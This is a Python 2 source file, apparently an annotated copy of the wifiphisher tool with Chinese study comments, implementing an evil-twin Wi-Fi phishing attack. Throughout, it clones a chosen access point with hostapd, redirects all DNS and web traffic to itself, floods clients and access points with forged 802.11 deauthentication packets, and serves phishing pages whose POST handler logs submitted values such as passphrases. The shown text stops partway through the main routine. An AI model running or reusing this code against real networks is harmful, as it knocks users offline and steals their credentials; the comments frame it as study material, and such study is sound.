#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import os
import ssl
import re
import time
import sys
import SimpleHTTPServer
import BaseHTTPServer
import httplib
import SocketServer
import cgi
import argparse
import fcntl
from threading import Thread, Lock
from subprocess import Popen, PIPE, check_output
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

"""
    预备知识：
    1 无线网卡接口模式：
        Ad-hoc：不带AP的点对点无线网络
        Managed：通过多个AP组成的网络，无线设备可以在这个网络中漫游
        Master：设置该无线网卡为一个AP
        Repeater：设置为无线网络中继设备，可以转发网络包
        Secondary：设置为备份的AP/Repeater
        Monitor：监听模式
        Auto：由无线网卡自动选择工作模式
    2 Scapy涉及到的发包和嗅探
        scapy可以脱离python使用，在linux用scapy敲一下就可看到包的内容
        官方文档 http://www.secdev.org/projects/scapy/doc/
    3 Linux命令及工具
        建议按网上教程，完全使用命令行配置一遍Linux系统的wifi热点
        命令：
            iw
            iwconfig
            ifconfig
        工具：
            dhcp
            hostapd
            dnsmasq
    4 攻击姿势
        克隆：伪造了源头的名称、信道、mac地址
        抑制源头：这里只使用了双向deauth和广播deauth两种（这个有点弱啊）
        钓鱼：开两个端口，使用HTTP和HTTPS服务挂钓鱼页面，同时嗅探

    建议先由程序主函数进入，按运行过程理解本代码
"""


conf.verb = 0

# Basic configuration
PORT = 8080
SSL_PORT = 443
PEM = 'cert/server.pem'
# 钓鱼页面的文件夹，会自动在里面找index.html
PHISING_PAGE = "phishing-scenarios/minimal"
POST_VALUE_PREFIX = "wfphshr"
NETWORK_IP = "10.0.0.0"
NETWORK_MASK = "255.255.255.0"
NETWORK_GW_IP = "10.0.0.1"
DHCP_LEASE = "10.0.0.2,10.0.0.100,12h"

# 把程序输出定位到/dev/null,否则会在程序运行时会在标准输出中显示命令的运行信息
# for subprocess (stdout = DN, stderr = DN)
DN = open(os.devnull, 'w')

# Console colors
W = '\033[0m'    # white (normal)
R = '\033[31m'   # red
G = '\033[32m'   # green
O = '\033[33m'   # orange
B = '\033[34m'   # blue
P = '\033[35m'   # purple
C = '\033[36m'   # cyan
GR = '\033[37m'  # gray
T = '\033[93m'   # tan

count = 0  # for channel hopping Thread
APs = {}  # for listing APs
hop_daemon_running = True
terminate = False

# in threading.py
lock = Lock()

#
def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-c",
        "--channel",
        help="Choose the channel for monitoring. Default is channel 1",
        default="1"
    )
    parser.add_argument(
        "-s",
        "--skip",
        help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA"
    )
    parser.add_argument(
        "-jI",
        "--jamminginterface",
        help=("Choose monitor mode interface. " +
              "By default script will find the most powerful interface and " +
              "starts monitor mode on it. Example: -jI mon5"
              )
    )
    parser.add_argument(
        "-aI",
        "--apinterface",
        help=("Choose monitor mode interface. " +
              "By default script will find the most powerful interface and " +
              "starts monitor mode on it. Example: -jI mon5"
              )
    )
    parser.add_argument(
        "-m",
        "--maximum",
        help=("Choose the maximum number of clients to deauth." +
              "List of clients will be emptied and repopulated after" +
              "hitting the limit. Example: -m 5"
              )
    )
    parser.add_argument(
        "-n",
        "--noupdate",
        help=("Do not clear the deauth list when the maximum (-m) number" +
              "of client/AP combos is reached. Must be used in conjunction" +
              "with -m. Example: -m 10 -n"
              ),
        action='store_true'
    )
    parser.add_argument(
        "-t",
        "--timeinterval",
        help=("Choose the time interval between packets being sent." +
              " Default is as fast as possible. If you see scapy " +
              "errors like 'no buffer space' try: -t .00001"
              )
    )
    parser.add_argument(
        "-p",
        "--packets",
        help=("Choose the number of packets to send in each deauth burst. " +
              "Default value is 1; 1 packet to the client and 1 packet to " +
              "the AP. Send 2 deauth packets to the client and 2 deauth " +
              "packets to the AP: -p 2"
              )
    )
    parser.add_argument(
        "-d",
        "--directedonly",
        help=("Skip the deauthentication packets to the broadcast address of" +
              "the access points and only send them to client/AP pairs"
              ),
        action='store_true')
    parser.add_argument(
        "-a",
        "--accesspoint",
        help="Enter the MAC address of a specific access point to target"
    )

    return parser.parse_args()

#
class SecureHTTPServer(BaseHTTPServer.HTTPServer):
    """
    Simple HTTP server that extends the SimpleHTTPServer standard
    module to support the SSL protocol.

    Only the server is authenticated while the client remains
    unauthenticated (i.e. the server will not request a client
    certificate).

    It also reacts to self.stop flag.
    """
    def __init__(self, server_address, HandlerClass):
        SocketServer.BaseServer.__init__(self, server_address, HandlerClass)
        self.socket = ssl.SSLSocket(
            socket.socket(self.address_family, self.socket_type),
            keyfile=PEM,
            certfile=PEM
        )

        self.server_bind()
        self.server_activate()

    def serve_forever(self):
        """
        Handles one request at a time until stopped.
        """
        self.stop = False
        while not self.stop:
            self.handle_request()

#
class SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    """
    Request handler for the HTTPS server. It responds to
    everything with a 301 redirection to the HTTP server.
    """
    def do_QUIT(self):
        """
        Sends a 200 OK response, and sets server.stop to True
        """
        self.send_response(200)
        self.end_headers()
        self.server.stop = True

    def setup(self):
        self.connection = self.request
        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://' + NETWORK_GW_IP + ':' + str(PORT))
        self.end_headers()

    def log_message(self, format, *args):
        return

#
class HTTPServer(BaseHTTPServer.HTTPServer):
    """
    HTTP server that reacts to self.stop flag.
    """

    def serve_forever(self):
        """
        Handle one request at a time until stopped.
        """
        self.stop = False
        while not self.stop:
            self.handle_request()

#
class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    """
    Request handler for the HTTP server that logs POST requests.
    """
    def redirect(self, page="/"):
        self.send_response(301)
        self.send_header('Location', page)
        self.end_headers()

    def do_QUIT(self):
        """
        Sends a 200 OK response, and sets server.stop to True
        """
        self.send_response(200)
        self.end_headers()
        self.server.stop = True

    def do_GET(self):

        if self.path == "/":
            wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
            with open(wifi_webserver_tmp, "a+") as log_file:
                log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
                               self.client_address[0] + W + "\n"
                               )
                log_file.close()
            self.path = "index.html"
        self.path = "%s/%s" % (PHISING_PAGE, self.path)

        if self.path.endswith(".html"):
            if not os.path.isfile(self.path):
                self.send_response(404)
                return
            f = open(self.path)
            self.send_response(200)
            self.send_header('Content-type', 'text-html')
            self.end_headers()
            # Send file content to client
            self.wfile.write(f.read())
            f.close()
            return
        # Leave binary and other data to default handler.
        else:
            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        global terminate
        redirect = False
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST',
                     'CONTENT_TYPE': self.headers['Content-type'],
                     })
        if not form.list:
            return
        for item in form.list:
            if item.name and item.value and POST_VALUE_PREFIX in item.name:
                redirect = True
                wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
                with open(wifi_webserver_tmp, "a+") as log_file:
                    log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
                                   T + self.client_address[0] +
                                   R + " " + item.name + "=" + item.value +
                                   W + "\n"
                                   )
                    log_file.close()
        if redirect == True:
            self.redirect("/upgrading.html")
            terminate = True
            return
        self.redirect()

    def log_message(self, format, *args):
        return

#
def stop_server(port=PORT, ssl_port=SSL_PORT):
    """
    Sends QUIT request to HTTP server running on localhost:<port>
    """
    conn = httplib.HTTPConnection("localhost:%d" % port)
    conn.request("QUIT", "/")
    conn.getresponse()

    conn = httplib.HTTPSConnection("localhost:%d" % ssl_port)
    conn.request("QUIT", "/")
    conn.getresponse()

#
def shutdown():
    """
    Shutdowns program.
    """
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('pkill airbase-ng')
    os.system('pkill dnsmasq')
    os.system('pkill hostapd')
    if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
        os.remove('/tmp/wifiphisher-webserver.tmp')
    if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
        os.remove('/tmp/wifiphisher-jammer.tmp')
    if os.path.isfile('/tmp/hostapd.conf'):
        os.remove('/tmp/hostapd.conf')
    reset_interfaces()
    print '\n[' + R + '!' + W + '] Closing'
    sys.exit(0)

#
def get_interfaces():

    """
    获取接口信息
    把机器上的无线网卡按monitor和managed状态分类。存入interfaces并返回
    最终interfaces会是这样:(dict)interfaces={"monitor":[wlan0], "managed":[wlan1], "all":[wlan0, wlan1]}
    """

    interfaces = {"monitor": [], "managed": [], "all": []}
    # 使用命令iwconfig查看网卡设备列表
    proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)

    '''
    Popen().communicate()
    与子进程进行交互。向stdin发送数据，或从stdout和stderr中读取数据。
    可选参数input指定发送到子进程的参数。
    Communicate()返回一个元组：(stdoutdata, stderrdata)。
    注意：如果希望通过进程的stdin向其发送数据，在创建Popen对象的时候，参数stdin必须被设置为PIPE。
    同样，如果希望从stdout和stderr获取数据，必须将stdout和stderr设置为PIPE
    '''
    for line in proc.communicate()[0].split('\n'): # 将iwconfig的输出结果按换行符分割
        if len(line) == 0:
            continue  # Isn't an empty string
        if line[0] != ' ':  # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            # 不读取有线连接所对应的行
            if not wired_search:  # Isn't wired
                iface = line[:line.find(' ')]  # is the interface （分割出网卡名字）
                # 判断是哪种模式，并存入dict
                if 'Mode:Monitor' in line:
                    interfaces["monitor"].append(iface)
                elif 'IEEE 802.11' in line:
                    interfaces["managed"].append(iface)
                interfaces["all"].append(iface)
    return interfaces

#
def get_iface(mode="all", exceptions=["_wifi"]):
    '''
    从interface的网卡名称中取出某一类型的值
    '''
    ifaces = get_interfaces()[mode]
    for i in ifaces:
        if i not in exceptions:
            return i
    return False

#
def reset_interfaces():
    '''
    重新设置无线网卡的状态
    '''
    # 删除“jam0”端口
    Popen(['iw', 'dev', 'jam0', 'del'], stdout=DN, stderr=DN)
    monitors = get_interfaces()["monitor"]
    for m in monitors:
        # 如果有处于监听模式的网卡，将其关闭：airmon-ng stop mon0
        if 'mon' in m:
            Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
        else:
            # 禁用“wlan0”网卡 - ifconfig wlan0 down
            Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
            # 设置网卡模式为“managed” -
            # 常见的有Master、Managed、ad-hoc、monitor
            # 其中Master模式是作为wifi热点的提供者 Managed模式是作为热点的连接者
            Popen(['iwconfig', m, 'mode', 'managed'], stdout=DN, stderr=DN)
            # 开启“m”网卡
            Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)

#
def create_virtual_monitor(iface, virtual): 
    try:
        # 使用iface网卡建立一个monitor类型的虚拟接口virtual
        # iw dev wlan0 interface add jam0 type monitor flags none
        proc = check_output(['iw', 'dev', iface, 'interface', 'add', virtual, 'type', 'monitor'])
        proc = check_output(['ifconfig', virtual, 'up'])
    except:
        reset_interfaces()
        sys.exit((
            '\n[' + R + '-' + W + '] Unable to create virtual interface out of ' + iface + ')!\n' +
            '[' + R + '!' + W + '] Closing'
        ))
    return virtual

#
def get_internet_interface():
    '''return the wifi internet connected iface'''
    inet_iface = None

    if os.path.isfile("/sbin/ip") == True:
        # 列路由状态表
        proc = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
        def_route = proc.communicate()[0].split('\n')  # [0].split()
        for line in def_route:
            if 'wlan' in line and 'default via' in line:
                line = line.split()
                inet_iface = line[4]
                ipprefix = line[2][:2]  # Just checking if it's 192, 172, or 10
                return inet_iface
    else:
        proc = open('/proc/net/route', 'r')
        default = proc.readlines()[1]
        if "wlan" in default:
            def_route = default.split()[0]
        x = iter(default.split()[2])
        res = [''.join(i) for i in zip(x, x)]
        d = [str(int(i, 16)) for i in res]
        return inet_iface
    return False

#
def channel_hop(mon_iface):
    # 本函数用于单纯的信道切换,同时结合其他线程完成对11个信道进行扫描的任务
    # 切换+嗅探=扫描
    chan = 0
    err = None
    while hop_daemon_running:
        try:
            err = None
            if chan > 11:
                chan = 0
            chan = chan + 1
            channel = str(chan)
            # 指定mon_iface 的challel
            iw = Popen(
                ['iw', 'dev', mon_iface, 'set', 'channel', channel],
                stdout=DN, stderr=PIPE
            )
            for line in iw.communicate()[1].split('\n'):
                # iw dev shouldn't display output unless there's an error
                if len(line) > 2:
                    with lock:
                        err = (
                            '[' + R + '-' + W + '] Channel hopping failed: ' +
                            R + line + W + '\n'
                            'Try disconnecting the monitor mode\'s parent' +
                            'interface (e.g. wlan0)\n'
                            'from the network if you have not already\n'
                        )
                    break
            time.sleep(1)
        except KeyboardInterrupt:
            sys.exit()

#
def sniffing(interface, cb):
    '''
    This exists for if/when I get deauth working
    so that it's easy to call sniff() in a thread
    '''
    """
    scapy.sniff()函数说明
    store: wether to store sniffed packets or discard them
    prn: function to apply to each packet. If something is returned,
         it is displayed. Ex:
         ex: prn = lambda x: x.summary()
    """
    sniff(iface=interface, prn=cb, store=0)

#
def targeting_cb(pkt):
    # 对嗅探到的包进行处理，提取数据并保存
    global APs, count
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        try:
            ap_channel = str(ord(pkt[Dot11Elt:3].info))
        except Exception:
            return
        essid = pkt[Dot11Elt].info
        mac = pkt[Dot11].addr2
        if len(APs) > 0:
            for num in APs:
                if essid in APs[num][1]:
                    return
        count += 1
        APs[count] = [ap_channel, essid, mac]
        target_APs()

#
def target_APs():
    """
    打印扫描到的AP
    """
    global APs, count
    os.system('clear')
    print ('[' + G + '+' + W + '] Ctrl-C at any time to copy an access' +
           ' point from below')
    print 'num  ch   ESSID'
    print '---------------'
    for ap in APs:
        print (G + str(ap).ljust(2) + W + ' - ' + APs[ap][0].ljust(2) + ' - ' +
               T + APs[ap][1] + W)

#
def copy_AP():
    """
    获得用户指定AP的channel, essid, mac信息
    """
    global APs, count
    copy = None
    while not copy:
        try:
            copy = raw_input(
                ('\n[' + G + '+' + W + '] Choose the [' + G + 'num' + W +
                 '] of the AP you wish to copy: ')
            )
            copy = int(copy)
        except Exception:
            copy = None
            continue
    try:
        channel = APs[copy][0]
        essid = APs[copy][1]
        if str(essid) == "\x00":
            essid = ' '
        mac = APs[copy][2]
        return channel, essid, mac
    except KeyError:
        return copy_AP()

#
def start_ap(mon_iface, channel, essid, args):
    """
    使用hostapd 通过iface channel essid 信息开启伪AP
    """
    print '[' + T + '*' + W + '] Starting the fake access point...'
    # 准备hostapd文件中所需的配置信息
    # 修改了interface，ssid，channel这三个值
    config = (
        'interface=%s\n'
        'driver=nl80211\n'
        'ssid=%s\n'
        'hw_mode=g\n'
        'channel=%s\n'
        'macaddr_acl=0\n'
        'ignore_broadcast_ssid=0\n'
    )

    # 写入文件
    with open('/tmp/hostapd.conf', 'w') as dhcpconf:
            dhcpconf.write(config % (mon_iface, essid, channel))

    # 运行新的设置
    Popen(['hostapd', '/tmp/hostapd.conf'], stdout=DN, stderr=DN)
    try:
        time.sleep(6)  # Copied from Pwnstar which said it was necessary?
    except KeyboardInterrupt:
        shutdown()

#
def dhcp_conf(interface):
    #设置DHCP
    config = (
        'no-resolv\n'
        'interface=%s\n'
        'dhcp-range=%s\n'
        'address=/#/%s'
    )

    with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
        dhcpconf.write(config % (interface, DHCP_LEASE, NETWORK_GW_IP))
    return '/tmp/dhcpd.conf'

#
def dhcp(dhcpconf, mon_iface):
    # 使用Dnsmasq做DNS缓存服务器和DHCP
    os.system('echo > /var/lib/misc/dnsmasq.leases')
    dhcp = Popen(['dnsmasq', '-C', dhcpconf], stdout=PIPE, stderr=DN)
    Popen(['ifconfig', str(mon_iface), 'mtu', '1400'], stdout=DN, stderr=DN)
    Popen(
        ['ifconfig', str(mon_iface), 'up', NETWORK_GW_IP,
         'netmask', NETWORK_MASK
         ],
        stdout=DN,
        stderr=DN
    )
    # Make sure that we have set the network properly.
    proc = check_output(['ifconfig', str(mon_iface)])
    if NETWORK_GW_IP not in proc:
        return False
    time.sleep(.5) # Give it some time to avoid "SIOCADDRT: Network is unreachable"
    os.system(
        ('route add -net %s netmask %s gw %s' % 
        (NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP))
    )
    return True

#
def get_strongest_iface(exceptions=[]):
    """
     1找出所有状态为managed的网卡接口
     2让每个端口去扫区域中的外部AP
     3筛选扫到结果最多的端口，把这个strongest的端口返回
     比如man0 扫到3个AP man1扫到5个AP 认为man1更强并将其返回
    """

    # 得到所有状态是managed的接口
    interfaces = get_interfaces()["managed"]
    scanned_aps = [] # 存储扫描结果
    for i in interfaces:
        if i in exceptions:
            continue
        count = 0 # 记录某一个端口扫到的AP数量
        # iwlist wlan0 scan
        # 使用 wlan这个端口扫描并列出区域内的无线AP
        proc = Popen(['iwlist', i, 'scan'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if ' - Address:' in line:  # first line in iwlist scan for a new AP
                count += 1
        # 扫描到的结果添加到列表
        scanned_aps.append((count, i))
        print ('[' + G + '+' + W + '] Networks discovered by '
               + G + i + W + ': ' + T + str(count) + W)
    if len(scanned_aps) > 0:
        # 排序，找出“最强”端口
        interface = max(scanned_aps)[1]
        return interface
    return False

#
def start_mode(interface, mode="monitor"):
    """
    以mode模式开启interface接口（默认为monitor模式）
    """
    print ('[' + G + '+' + W + '] Starting ' + mode + ' mode off '
           + G + interface + W)
    try:
        os.system('ifconfig %s down' % interface)
        os.system('iwconfig %s mode %s' % (interface, mode))
        os.system('ifconfig %s up' % interface)
        return interface
    except Exception:
        sys.exit('[' + R + '-' + W + '] Could not start %s mode' % mode)


# Wifi Jammer stuff
# TODO: Merge this with the other channel_hop method.
def channel_hop2(mon_iface):
    '''
    First time it runs through the channels it stays on each channel for
    5 seconds in order to populate the deauth list nicely.
    After that it goes as fast as it can
    '''
    global monchannel, first_pass

    channelNum = 0
    err = None

    while 1:
        # 如果用户指定信道，就直接攻击该信道
        if args.channel:
            with lock:
                monchannel = args.channel
        else:
            channelNum += 1
            # 如果循环完了，信道值超过11，重置channelNum为1，重置first_pass为0
            if channelNum > 11:
                channelNum = 1
                with lock:
                    first_pass = 0
            with lock:
                monchannel = str(channelNum)

            proc = Popen(
                ['iw', 'dev', mon_iface, 'set', 'channel', monchannel],
                stdout=DN,
                stderr=PIPE
            )
            # 判断是否出错
            for line in proc.communicate()[1].split('\n'):
                if len(line) > 2:
                    # iw dev shouldnt display output unless there's an error
                    err = ('[' + R + '-' + W + '] Channel hopping failed: '
                           + R + line + W)

        output(monchannel)
        if args.channel:
            time.sleep(.05)
        else:
            # For the first channel hop thru, do not deauth
            # 外部初始的first_pass=1,这里意思是不对第一次循环的信道进行deauth？
            if first_pass == 1:
                time.sleep(1)
                continue
        # 在确定的信道下发起攻击
        deauth(monchannel)

#
def deauth(monchannel):
    '''
    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway
    if there's multi-APs to one gateway. Constantly scans the clients_APs list
    and starts a thread to deauth each instance
    '''

    pkts = []

    if len(clients_APs) > 0:
        with lock:
            for x in clients_APs:
                client = x[0]
                ap = x[1]
                ch = x[2]
                '''
                Can't add a RadioTap() layer as the first layer or it's a
                malformed Association request packet?
                Append the packets to a new list so we don't have to hog the
                lock type=0, subtype=12?
                '''
                # 如果信道是我们AP的信道
                # 伪造一个源地址是Ap，目标地址是client的Deauth包
                # 同时伪造一个源地址是client，目标地址是Ap的Deauth包
                # 双向deauth Flood攻击
                if ch == monchannel:
                    deauth_pkt1 = Dot11(
                        addr1=client,
                        addr2=ap,
                        addr3=ap) / Dot11Deauth()
                    deauth_pkt2 = Dot11(
                        addr1=ap,
                        addr2=client,
                        addr3=client) / Dot11Deauth()
                    pkts.append(deauth_pkt1)
                    pkts.append(deauth_pkt2)
    if len(APs) > 0:
        # 如果用户没有指定directedonly
        if not args.directedonly:
            with lock:
                for a in APs:
                    ap = a[0]
                    ch = a[1]
                    if ch == monchannel:
                        # 伪造Ap发Deauth广播包
                        deauth_ap = Dot11(
                            addr1='ff:ff:ff:ff:ff:ff',
                            addr2=ap,
                            addr3=ap) / Dot11Deauth()
                        pkts.append(deauth_ap)

    if len(pkts) > 0:
        # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
        # 如果用户没有通过命令行指定发包间隔，默认为最小值
        if not args.timeinterval:
            args.timeinterval = 0
        # 如果用户没有指定发包数量，默认每种包发一个
        # 感觉这里发一个包根本打不掉啊，考虑一下发多少效果最佳？
        if not args.packets:
            args.packets = 1
        # 把pkts里的Deauth包都发出去
        for p in pkts:
            send(p, inter=float(args.timeinterval), count=int(args.packets))

#
def output(monchannel):
    # 交互界面打出被干扰的设备
    wifi_jammer_tmp = "/tmp/wifiphisher-jammer.tmp"
    with open(wifi_jammer_tmp, "a+") as log_file:
        log_file.truncate()
        with lock:
            for ca in clients_APs:
                if len(ca) > 3:
                    log_file.write(
                        ('[' + T + '*' + W + '] ' + O + ca[0] + W +
                         ' - ' + O + ca[1] + W + ' - ' + ca[2].ljust(2) +
                         ' - ' + T + ca[3] + W + '\n')
                    )
                else:
                    log_file.write(
                        '[' + T + '*' + W + '] ' + O + ca[0] + W +
                        ' - ' + O + ca[1] + W + ' - ' + ca[2]
                    )
        with lock:
            for ap in APs:
                log_file.write(
                    '[' + T + '*' + W + '] ' + O + ap[0] + W +
                    ' - ' + ap[1].ljust(2) + ' - ' + T + ap[2] + W + '\n'
                )
        # print ''

#
def noise_filter(skip, addr1, addr2):
    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast,
    # broadcast
    """
    skip:为过滤表添加一条过滤条件
    addr1和addr2如果有一方在过滤表中，就return true
    """
    ignore = [
        'ff:ff:ff:ff:ff:ff', # broadcast
        '00:00:00:00:00:00', # broadcast目标mac地址
        '33:33:00:', '33:33:ff:',# IPv6mcast
        '01:80:c2:00:00:00',# Bridge Group Address BPDU报文（stp协议报文）?干什么的?
        '01:00:5e:',# multicast,多播特征地址
        mon_MAC # 本机AP
    ]
    if skip:
        ignore.append(skip)
    for i in ignore:
        if i in addr1 or i in addr2:
            return True

#
def cb(pkt):
    '''
    Look for dot11 packets that aren't to or from broadcast address,
    are type 1 or 2 (control, data), and append the addr1 and addr2
    to the list of deauth targets.


    分析802.11包，找出type为1和2的包，把其中的addr1和addr2加入deauth攻击列表

    802.11数据包的type字段有三种，分别是
    type=0 managment管理包 包括认证（authentication）、关联（association）和信号（beacon）数据包。
    type=1 control控制包 包括请求发送（request-to-send）和准予发送（clear-to-send）数据包
    type=2 data数据包 含有真正的数据

    两个addr分别是数据的接受者和发送者
    '''
    global clients_APs, APs

    # return these if's keeping clients_APs the same or just reset clients_APs?
    # I like the idea of the tool repopulating the variable more
    if args.maximum:
        if args.noupdate:
            if len(clients_APs) > int(args.maximum):
                return
        else:
            if len(clients_APs) > int(args.maximum):
                with lock:
                    clients_APs = []
                    APs = []

    '''
    We're adding the AP and channel to the deauth list at time of creation
    rather than updating on the fly in order to avoid costly for loops
    that require a lock.
    '''

    '''
    Dot11() - 802.11数据包
    '''
    # 如果pkt数据包含有“802.11”层
    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:

            # Filter out all other APs and clients if asked
            if args.accesspoint:
                # 如果我们要攻击的AP地址不在这两个地址里，退出
                if args.accesspoint not in [pkt.addr1, pkt.addr2]:
                    return

            # Check if it's added to our AP list
            # 如果包是Beacon类型或者ProbeResponse类型：
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                APs_add(clients_APs, APs, pkt, args.channel)

            # Ignore all the noisy packets like spanning tree
            # 如果包的特征信息在noise列表里，退出
            if noise_filter(args.skip, pkt.addr1, pkt.addr2):
                return

            # Management = 1, data = 2
            # 如果包是这两种类型，添加到deauth列表
            if pkt.type in [1, 2]:
                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)

#
def APs_add(clients_APs, APs, pkt, chan_arg):
    # 无线网络名字
    ssid = pkt[Dot11Elt].info
    # mac地址
    bssid = pkt[Dot11].addr3
    try:
        # Thanks to airoscapy for below
        # 从802.11 Information Element字段得到Ap的channel
        ap_channel = str(ord(pkt[Dot11Elt:3].info))
        # Prevent 5GHz APs from being thrown into the mix
        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
        if ap_channel not in chans:
            return

        if chan_arg:
            if ap_channel != chan_arg:
                return

    except Exception:
        return

    if len(APs) == 0:
        with lock:
            return APs.append([bssid, ap_channel, ssid])
    else:
        for b in APs:
            if bssid in b[0]:
                return
        with lock:
            return APs.append([bssid, ap_channel, ssid])

#
def clients_APs_add(clients_APs, addr1, addr2):

    if len(clients_APs) == 0:
        if len(APs) == 0:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])
        else:
            AP_check(addr1, addr2)

    # Append new clients/APs if they're not in the list
    else:
        for ca in clients_APs:
            if addr1 in ca and addr2 in ca:
                return

        if len(APs) > 0:
            return AP_check(addr1, addr2)
        else:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])

#
def AP_check(addr1, addr2):
    # 检查一个包的两个地址是否与AP列表中所记录的AP有关，有的话把地址加入clients_APs列表
    for ap in APs:
        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
            with lock:
                return clients_APs.append([addr1, addr2, ap[1], ap[2]])

#
def mon_mac(mon_iface):
    #获取伪AP的mac
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print ('[' + G + '*' + W + '] Monitor mode: ' + G
           + mon_iface + W + ' - ' + O + mac + W)
    return mac

#
def sniff_dot11(mon_iface):
    """
    We need this here to run it from a thread.
    """
    # scapy.sniff()
    sniff(iface=mon_iface, store=0, prn=cb)

#
def get_hostapd():
    """
    确认本机有hostapd，如果没有自动安装
    """
    if not os.path.isfile('/usr/sbin/hostapd'):
        install = raw_input(
            ('[' + T + '*' + W + '] hostapd not found ' +
             'in /usr/sbin/hostapd, install now? [y/n] ')
        )
        if install == 'y':
            os.system('apt-get -y install hostapd --force-yes')
        else:
            sys.exit(('[' + R + '-' + W + '] hostapd' +
                     'not found in /usr/sbin/hostapd'))
    if not os.path.isfile('/usr/sbin/hostapd'):
        sys.exit((
            '\n[' + R + '-' + W + '] Unable to install the \'hostapd\' package!\n' +
            '[' + T + '*' + W + '] This process requires a persistent internet connection!\n' +
            'Please follow the link below to configure your sources.list\n' +
            B + 'http://docs.kali.org/general-use/kali-linux-sources-list-repositories\n' + W +
            '[' + G + '+' + W + '] Run apt-get update for changes to take effect.\n' +
            '[' + G + '+' + W + '] Rerun the script again to install hostapd.\n' +
            '[' + R + '!' + W + '] Closing'
         ))

if __name__ == "__main__":

    print "               _  __ _       _     _     _               "
    print "              (_)/ _(_)     | |   (_)   | |              "
    print "     __      ___| |_ _ _ __ | |__  _ ___| |__   ___ _ __ "
    print "     \ \ /\ / / |  _| | '_ \| '_ \| / __| '_ \ / _ \ '__|"
    print "      \ V  V /| | | | | |_) | | | | \__ \ | | |  __/ |   "
    print "       \_/\_/ |_|_| |_| .__/|_| |_|_|___/_| |_|\___|_|   "
    print "                      | |                                "
    print "                      |_|                                "
    print "                                                         "

    # Parse args
    # 接收用户输入
    args = parse_args()

    # Are you root?
    # 确保程序以root权限运行
    if os.geteuid():
        sys.exit('[' + R + '-' + W + '] Please run as root')

    # Get hostapd if needed
    # 确保系统已安装hostapd
    get_hostapd()

    # TODO: We should have more checks here:
    # Is anything binded to our HTTP(S) ports?
    # Maybe we should save current iptables rules somewhere
    # 也许这里该检查一下我们的端口是否已经被占用？
    # 我们也许应该先保存一下当前系统中的配置，让它被修改之后还能复原？


    # Get interfaces
    # 重设无线网卡的状态
    reset_interfaces()

    # 找一个合适的网卡接口做AP
    strongest_iface = get_strongest_iface()
    if not strongest_iface:
        sys.exit(
            ('[' + R + '-' + W +
             '] No wireless interfaces found, bring one up and try again'
             )
        )

    # 启动这个接口
    virtual_iface = create_virtual_monitor(strongest_iface, "jam0")


    


    # Set iptable rules and kernel variables.
    # 配置系统和端口
    os.system(
        ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s' 
        % (NETWORK_GW_IP, PORT))
    )
    os.system(
        ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s' 
        % (NETWORK_GW_IP, SSL_PORT))
    )
    Popen(
        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
        stdout=DN,
        stderr=PIPE
    )

    print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'

    # Copy AP
    '''
    开启一个线程，让端口在11个信道不停切换，
    同时嗅探接口收到的包，并按规则处理，得到AP列表，这样就完成了一个扫描AP的过程
    把AP列表显示在屏幕上让用户选择copy哪一个
    执行copy操作，此时伪AP还没有启动
    '''
    time.sleep(3)
    # 开启信道切换的线程
    hop = Thread(target=channel_hop, args=(virtual_iface,))
    # 守护
    hop.daemon = True
    hop.start()
    # 嗅探接口并处理输出
    sniffing(virtual_iface, targeting_cb)
    # 复制指定AP的设置
    channel, essid, ap_mac = copy_AP()
    # 结束线程守护
    hop_daemon_running = False


    # Start AP
    '''
    使用DHCP启动伪AP
    '''
    start_ap(strongest_iface, channel, essid, args)
    dhcpconf = dhcp_conf(strongest_iface)
